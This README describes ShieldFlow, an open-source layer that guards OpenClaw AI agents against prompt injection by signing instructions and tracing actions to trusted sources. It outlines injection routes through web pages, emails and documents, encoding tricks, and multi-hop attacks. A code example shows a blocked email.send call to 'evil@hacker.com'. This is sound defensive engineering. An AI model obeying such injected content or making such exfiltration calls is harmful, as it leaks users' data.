# 🛡️ ShieldFlow

**Cryptographic trust boundaries for AI agents — built for OpenClaw, by AI agents.**

ShieldFlow protects OpenClaw agents from prompt injection attacks. Not by guessing if text looks malicious, but by verifying who is authorised to give instructions.

> *"AI protecting AI."*

## What is ShieldFlow?

ShieldFlow is a free, open-source security layer built exclusively for [OpenClaw](https://openclaw.ai). It sits between your agent and the outside world, enforcing cryptographic trust boundaries so that web pages, emails, documents, and external data sources can never hijack your agent — no matter what they say.

**This project is:**
- 🔓 Fully free and open source (Apache 2.0)
- 🤖 Built entirely by AI agents, for AI agents
- 🛡️ OpenClaw-native — designed specifically for the OpenClaw ecosystem
- 🚫 Not a SaaS product, not a paid service, not a commercial offering

## The Problem

Every OpenClaw agent that reads emails, browses the web, or processes documents is vulnerable to prompt injection. A poisoned web page, a malicious email, or a hidden instruction in a PDF can hijack your agent into leaking data, sending unauthorised messages, or executing harmful actions.

Existing solutions try to **detect** malicious text using classifiers — an arms race attackers always win. ShieldFlow takes a fundamentally different approach.

## The Solution

ShieldFlow enforces **cryptographic trust boundaries** at the infrastructure level:

```
User instruction (signed) ──→ ┌──────────────┐ ──→ OpenClaw Agent ──→ Actions
                               │  ShieldFlow  │                          │
Web pages (untrusted) ────→   │  Trust Layer │                   ┌──────┴──────┐
Emails (untrusted) ──────→   │              │                   │  Validator  │
Documents (untrusted) ───→   └──────────────┘                   └──────┬──────┘
                                                                        │
                                                                Approved / Blocked
```

1. **Every instruction source gets a trust level** — owner, user, system, agent, or none
2. **External data is always untrusted** — web pages, emails, documents can never give instructions, no matter what they say
3. **Every action requires a minimum trust level** — sending a message requires `user` trust, executing code requires `owner` trust
4. **Actions are traced to their origin** — if a tool call was triggered by untrusted data, it's blocked before execution

## Quick Start (OpenClaw)

Add to your OpenClaw config (`~/.openclaw/openclaw.json`):

```json
{
  "security": {
    "shieldflow": {
      "enabled": true,
      "mode": "enforce"
    }
  }
}
```

Or run as a local proxy in front of any LLM:

```bash
# Install
pip install shieldflow

# Generate default config
shieldflow init

# Start proxy (routes to OpenAI/Anthropic, enforces trust policies)
shieldflow proxy --port 8080 --target openai
```

Then point your OpenClaw agent at `http://localhost:8080/v1` instead of the provider directly. Full trust enforcement, zero configuration changes needed beyond the base URL.

## How It Works

### Trust Levels

```
OWNER (5)   — You, the agent owner
USER  (4)   — Authenticated users you've authorised
SYSTEM (3)  — Scheduled tasks, cron jobs
AGENT (2)   — Other AI agents
TOOL  (1)   — Tool/API outputs (informational only)
NONE  (0)   — Everything external: web, email, docs, APIs
```

### Core Properties

- **Trust never escalates** — content entering as `NONE` stays `NONE`, even after processing
- **Signatures are transport-layer** — HMAC signatures can't be forged by injected text
- **Actions require minimum trust** — configurable per action type
- **Provenance tracking** — every blocked action includes a full trace of what triggered it

### Example: Injection Blocked

```python
from shieldflow import SecureSession

session = SecureSession()

# Your instruction — signed and trusted
session.add_instruction("Summarise my emails and flag urgent ones")

# External email — untrusted
session.add_data(email_content, source="email", trust="none")

# This tool call gets blocked — triggered by untrusted email content
result = session.validate_action(ToolCall("email.send", {"to": "evil@hacker.com"}))
# result.blocked == True
# result.reason == "Action 'email.send' requires trust=user but was triggered
#                   by source with trust=none (email content)"
```

## What Gets Blocked

- Web pages attempting to hijack your agent
- Malicious emails with embedded instructions
- Documents with hidden text trying to trigger actions
- Data exfiltration via social engineering
- Multi-hop recursive injection attacks
- AGENT-relayed untrusted instructions

## What Doesn't Break

- Your agent still reads emails normally
- Your agent still browses the web
- Your agent still processes documents
- Legitimate actions from verified sources work as expected
- Adds < 10ms latency

## Project Status

🔨 **Active Development** — Phase B (Observability) in progress.

- [x] Core trust engine
- [x] HMAC instruction signing
- [x] Policy engine + data classification
- [x] Action provenance validator
- [x] Content sanitiser (unicode, base64, homoglyphs, ROT13)
- [x] FastAPI proxy server (OpenAI/Anthropic compatible)
- [x] 237 tests (including 84 adversarial red-team scenarios)
- [x] Full threat model
- [x] Audit logging
- [x] Prometheus metrics endpoint
- [x] Grafana dashboard
- [ ] Native OpenClaw plugin (no proxy needed)
- [ ] Local web dashboard
- [ ] `openclaw install shieldflow` one-liner

## Architecture

See [docs/architecture/](docs/architecture/) for full technical documentation:
- [Trust Model](docs/architecture/TRUST_MODEL.md)
- [System Overview](docs/architecture/SYSTEM_OVERVIEW.md)
- [Threat Model](docs/architecture/THREAT_MODEL.md)

## Documentation

- [API Reference](docs/api/REFERENCE.md)
- [Quickstart Guide](docs/guides/quickstart.md)
- [OpenClaw Integration](docs/guides/openclaw.md)
- [Examples](examples/)

## This Project

ShieldFlow is built and operated entirely by AI agents. Engineering, security research, content, and operations are all handled by an agent team. A human sponsor sets direction and approves milestones.

It's an experiment in AI-driven open source — and a practical answer to one of the biggest unsolved problems in AI agent security.

## Contributing

We welcome contributions — especially new injection patterns, bypass test cases, and integration guides.

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines. Security vulnerabilities: see [SECURITY.md](SECURITY.md).

## License

[Apache 2.0](LICENSE) — Free forever.

---

*Built by AI. For AI. To protect AI.*
